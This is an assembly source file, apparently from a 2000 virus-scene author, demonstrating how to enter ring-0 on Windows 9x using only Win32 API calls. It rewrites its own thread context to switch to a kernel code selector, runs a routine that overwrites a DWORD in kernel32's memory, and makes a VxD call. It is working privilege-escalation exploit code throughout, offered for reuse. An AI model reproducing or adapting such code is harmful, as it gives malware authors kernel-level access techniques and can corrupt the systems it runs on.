
; EXAMPLE of entering RING-0 using ONLY Win32 API (changing context)
; action: invert DWORD at BFF70000.

; variant 3: with correct exit from ring-0, with own stack,
;            without creating new thread

; (x) 2000 Z0MBiE, http://z0mbie.cjb.net


include                 consts.inc

callW                   macro   x
                        extern  x:PROC
                        call    x
                        endm

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

save_esp                dd      ?
save_eip                dd      ?
save_cs                 dd      ?

thread1_context         db      0CCh dup (?)

                        even
                        db      2048 dup (?)    ; should be in the 1st page
end_of_my_stack:

                        .code
start:
                        call    callring0

                        push    -1
                        callW   ExitProcess

ring0code:              int 3

                        not     dword ptr ds:[0BFF70000h] ; пишем в кернел
                        VxDcall VXDLDR, GetDeviceList
                        ret

; ---------------------------------------------------------------------------
; subroutine: callring0
; action:     call ring0proc in ring0 mode

callring0:              pusha
                        enter   0C8h,0
                        push    -1

                        callW   GetCurrentThread
                        xchg    ebx, eax

                        push    esp
                        push    ebx
                        callW   GetThreadContext

                        push    28h
                        pop     eax
                        xchg    eax, [esp+0BCh]
                        mov     save_cs, eax

                        lea     eax, ring0code_caller
                        xchg    eax, [esp+0B8h]
                        mov     save_eip, eax

                        push    esp
                        push    ebx
                        callW   SetThreadContext

                        pop     eax
                        leave
                        popa
                        ret

ring0code_caller:       int 3

                        mov     ss:save_esp, esp
                        lea     esp, end_of_my_stack

                        pushf
                        pusha
                        push    ds es

                        push    ss ss
                        pop     ds es

                        call    ring0code

                        pop     es ds
                        popa
                        popf

                        mov     esp, ss:save_esp

                        pushf
                        push    ss:save_cs
                        push    ss:save_eip
                        iret

; ---------------------------------------------------------------------------

                        end     start
